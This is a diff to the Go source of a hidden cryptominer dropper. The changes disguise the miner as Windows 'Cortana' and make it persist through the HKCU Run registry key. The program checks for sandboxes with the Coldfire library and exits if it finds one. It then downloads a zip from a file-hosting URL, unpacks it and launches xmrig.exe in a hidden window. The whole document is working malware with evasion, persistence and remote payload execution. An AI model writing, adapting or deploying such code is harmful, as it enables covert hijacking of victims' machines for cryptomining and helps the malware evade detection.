@@ -11,16 +11,16 @@ import (
 	"net/http"
 	"os"
 	"os/exec"
-	"os/user"
 	"path/filepath"
 	"strings"
 	"syscall"
 
-	coldfire "github.com/redcode-labs/Coldfire"
+	"github.com/redcode-labs/Coldfire"
 	"golang.org/x/sys/windows"
+	"golang.org/x/sys/windows/registry"
 )
 
-// func that downloads files
+// Func that downloads files
 func downloadFile(filepath string, url string) (err error) {
 	// Create the file
 	out, err := os.Create(filepath)
@@ -50,6 +50,7 @@ func downloadFile(filepath string, url string) (err error) {
 	return nil
 }
 
+// Func that unzips the source file and archives within that file
 func unzipSource(source, destination string) error {
 	// 1. Open the zip file
 	reader, err := zip.OpenReader(source)
@@ -75,6 +76,7 @@ func unzipSource(source, destination string) error {
 	return nil
 }
 
+// Func that unzips files
 func unzipFile(f *zip.File, destination string) error {
 	// 4. Check if file paths are not vulnerable to Zip Slip
 	filePath := filepath.Join(destination, f.Name)
@@ -114,8 +116,9 @@ func unzipFile(f *zip.File, destination string) error {
 	return nil
 }
 
+// Func that starts the xmrig command/process
 func startCommand(dir string) {
-	cmd := exec.Command(filepath.Join(dir, "xmrcache", "xmrig.exe"), "-c", filepath.Join(dir, "xmrcache", "config.json"))
+	cmd := exec.Command(filepath.Join(dir, "cortanacache", "xmrig.exe"), "-c", filepath.Join(dir, "cortanacache", "config.json"))
 
 	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
 
@@ -139,66 +142,49 @@ func startCommand(dir string) {
 	}
 }
 
-func createShortcut(shortcutPath string, targetPath string) error {
-	shortcut, err := os.Create(shortcutPath)
-	if err != nil {
-		return err
-	}
-	defer shortcut.Close()
-
-	shortcut.WriteString("[InternetShortcut]\n")
-	shortcut.WriteString("URL=file:///" + targetPath + "\n")
-	shortcut.WriteString("IconIndex=0\n")
-	shortcut.WriteString("IconFile=" + targetPath + "\n")
-	shortcut.Sync()
-
-	return nil
-}
-
+// Func that puts this binary into autostart
 func autoStart() {
-	u, err := user.Current()
+	key, err := registry.OpenKey(registry.CURRENT_USER, `SOFTWARE\Microsoft\Windows\CurrentVersion\Run`, registry.ALL_ACCESS)
 	if err != nil {
-		log.Printf("Error getting current user: %s\n", err)
+		log.Fatal(err)
 	}
-	startupFolder := filepath.Join(u.HomeDir, "AppData", "Roaming", "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
+	defer key.Close()
 
-	shortcutPath := filepath.Join(startupFolder, "xmrminer.lnk")
-	targetPath, err := os.Executable()
+	loc, _ := os.Executable()
+	err = key.SetStringValue("Cortana", loc)
 	if err != nil {
-		log.Printf("Error getting executable path: %s\n", err)
-	}
-
-	err = createShortcut(shortcutPath, targetPath)
-	if err != nil {
-		log.Printf("Error creating shortcut: %s\n", err)
+		log.Fatal(err)
 	}
 }
 
+// Main func that initializes everything
 func main() {
-	if coldfire.SandboxAll() {
-		os.Exit(0)
-	}
-	f, err := os.OpenFile("log.txt", os.O_RDWR|os.O_CREATE|os.O_APPEND, 0666)
+	f, err := os.OpenFile("cortanalog.txt", os.O_RDWR|os.O_CREATE|os.O_APPEND, 0666)
 	if err != nil {
 		log.Fatalf("error opening file: %v", err)
 	}
 	defer f.Close()
 	log.SetOutput(f)
 
+	if coldfire.SandboxAll() {
+		log.Println("SOMEERROR ;)")
+		os.Exit(0)
+	}
+
 	autoStart()
 
-	dir, err := ioutil.TempDir("", "xmrminer")
+	dir, err := ioutil.TempDir("", "cortanacache")
 	if err != nil {
 		log.Fatal(err)
 	}
 	defer os.RemoveAll(dir)
 
-	err = downloadFile(filepath.Join(dir, "xmrcache.zip"), "https://files.catbox.moe/g9ivbr.zip")
+	err = downloadFile(filepath.Join(dir, "cortanacache.zip"), "https://files.catbox.moe/g9ivbr.zip")
 	if err != nil {
 		log.Fatalf("error downloading file: %v", err)
 	}
 
-	err = unzipSource(filepath.Join(dir, "xmrcache.zip"), filepath.Join(dir, "xmrcache"))
+	err = unzipSource(filepath.Join(dir, "cortanacache.zip"), filepath.Join(dir, "cortanacache"))
 	if err != nil {
 		log.Fatal(err)
 	}
